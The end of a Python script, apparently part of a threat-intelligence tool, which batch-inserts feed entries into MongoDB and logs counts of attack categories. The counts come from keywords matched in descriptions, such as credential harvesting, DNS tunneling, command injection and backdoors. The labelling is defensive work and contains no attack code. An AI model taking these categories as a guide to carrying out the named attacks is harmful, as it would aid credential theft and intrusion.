            logger.info("Embeddings generated for %d feed entries", len(all_embeddings))
        except Exception as e:
            logger.warning("Embedding generation failed (%s). Inserting WITHOUT embeddings.", e)
    else:
        logger.warning("Skipping embeddings — inserting records without embeddings.")

    # Insert into urls collection (unified)
    batch_size = 200
    total_inserted = 0
    for i in range(0, len(feeds), batch_size):
        batch = feeds[i : i + batch_size]
        await db["urls"].insert_many(batch)
        total_inserted += len(batch)
        logger.info("Inserted batch: %d/%d", total_inserted, len(feeds))

    logger.info("Inserted %d threat intel entries into urls collection", total_inserted)

    # Print attack type breakdown
    from collections import Counter
    type_counts = Counter(f["threatClassification"] for f in feeds)
    logger.info("Threat type breakdown: %s", dict(type_counts))

    # Print generator breakdown using description heuristics
    attack_types = Counter()
    for f in feeds:
        desc = f["description"].lower()
        if "xss" in desc:
            attack_types["XSS"] += 1
        elif "sql injection" in desc:
            attack_types["SQL Injection"] += 1
        elif "path traversal" in desc:
            attack_types["Path Traversal"] += 1
        elif "command injection" in desc or "remote code execution" in desc:
            attack_types["Command Injection"] += 1
        elif "open redirect" in desc:
            attack_types["Open Redirect"] += 1
        elif "ssrf" in desc:
            attack_types["SSRF"] += 1
        elif "obfuscated" in desc:
            attack_types["Obfuscated Path"] += 1
        elif "base64" in desc:
            attack_types["Base64 Payload"] += 1
        elif "credential harvest" in desc:
            attack_types["Credential Harvesting"] += 1
        elif "executable" in desc or "double extension" in desc:
            attack_types["Malware Download"] += 1
        elif "subdomain" in desc:
            attack_types["Typosquat Subdomain"] += 1
        elif "dns tunnel" in desc:
            attack_types["DNS Tunneling"] += 1
        elif "cryptomin" in desc or "miner" in desc:
            attack_types["Cryptomining"] += 1
        elif "api abuse" in desc or "bulk" in desc or "mass data" in desc:
            attack_types["API Abuse"] += 1
        elif "supply chain" in desc or "backdoor" in desc:
            attack_types["Supply Chain"] += 1
        elif "watering hole" in desc or "exploit kit" in desc:
            attack_types["Watering Hole"] += 1
    logger.info("Attack category breakdown: %s", dict(attack_types))

    # Indexes live on the urls collection (url_vector_index already exists)
    # No need to create separate threat_intel indexes
    logger.info("Threat intel entries use the existing url_vector_index on urls collection")

    client.close()
    logger.info("Threat intel seeding complete!")


if __name__ == "__main__":
    asyncio.run(seed_threat_intel())
